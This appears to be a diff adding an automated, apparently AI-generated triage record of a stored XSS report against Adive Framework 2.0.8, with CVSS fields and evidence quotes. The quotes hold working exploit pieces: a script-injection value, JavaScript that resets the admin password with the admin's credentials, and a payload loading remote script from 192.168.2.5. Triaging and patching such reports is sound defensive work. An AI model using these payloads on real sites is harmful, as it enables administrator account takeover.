@@ -1,0 +1,77 @@
+{
+  "proposal": {
+    "is_vulnerability_report": true,
+    "summary": "Stored cross-site scripting in Adive Framework 2.0.8 user add page allows an attacker to store a script that, when an admin visits the admin/user page, performs a CSRF-like request to change the admin password.",
+    "affected_product": "Adive Framework 2.0.8",
+    "cwe": "CWE-79",
+    "cwe_quote": "Description : The parameter 'userUsername=' is vulnerable to Stored Cross-site scripting",
+    "cvss": {
+      "AV": {
+        "value": "N",
+        "quote": "POST /admin/user/add HTTP/1.1"
+      },
+      "AC": {
+        "value": "L",
+        "quote": ""
+      },
+      "PR": {
+        "value": "N",
+        "quote": ""
+      },
+      "UI": {
+        "value": "R",
+        "quote": "when admin visits the /admin/user page the payload will trigger."
+      },
+      "S": {
+        "value": "U",
+        "quote": ""
+      },
+      "C": {
+        "value": "L",
+        "quote": "As soon as admin will visit the page the payload will be triggered and the admin password will be changed to hacked@123"
+      },
+      "I": {
+        "value": "H",
+        "quote": "As soon as admin will visit the page the payload will be triggered and the admin password will be changed to hacked@123"
+      },
+      "A": {
+        "value": "H",
+        "quote": "As soon as admin will visit the page the payload will be triggered and the admin password will be changed to hacked@123"
+      }
+    },
+    "recommended_next_step": "Verify the vulnerable endpoint by reproducing the stored XSS in a test environment, confirm that a crafted script can perform state-changing requests as an authenticated admin, and then patch by properly encoding/escaping user-supplied input and adding CSRF protections on sensitive admin actions.",
+    "confidence": "high",
+    "evidence_quotes": [
+      {
+        "claim": "Stored XSS vulnerability description",
+        "quote": "Description : The parameter 'userUsername=' is vulnerable to Stored Cross-site scripting"
+      },
+      {
+        "claim": "Proof-of-concept POST showing XSS payload stored",
+        "quote": "userName=test&userUsername=<script>alert('xss')</script>&pass=test&cpass=test&permission=3"
+      },
+      {
+        "claim": "Description that admin visiting page triggers payload",
+        "quote": "when admin visits the /admin/user page the payload will trigger."
+      },
+      {
+        "claim": "Exploit changes admin password to a known value",
+        "quote": "As soon as admin will visit the page the payload will be triggered and the admin password will be changed to hacked@123"
+      },
+      {
+        "claim": "Exploit JavaScript performing POST to change config",
+        "quote": "xhttp.open(\"POST\", nuri, true);\n  xhttp.setRequestHeader(\"Content-type\", \"application/x-www-form-urlencoded\");\n  xhttp.withCredentials = \"true\";\n  var body = \"\";\n  body += \"\\r\\n\\r\\n\";\n  body +=\n\t\"userName=Administrator&confPermissions=1&pass=hacked@123&cpass=hacked@123&invokeType=web\";\n  xhttp.send(body);"
+      },
+      {
+        "claim": "Exploit stored payload example referencing external JS",
+        "quote": "userName=%3Cscript+src%3D%22http%3A%2F%2F192.168.2.5%2Fexp.js%22%3E%3C%2Fscript%3E&userUsername=test&pass=test&cpass=test&permission=3"
+      }
+    ]
+  },
+  "usage": {
+    "input_tokens": 2518,
+    "output_tokens": 865,
+    "latency_s": null,
+    "batch": true
+  }
+}
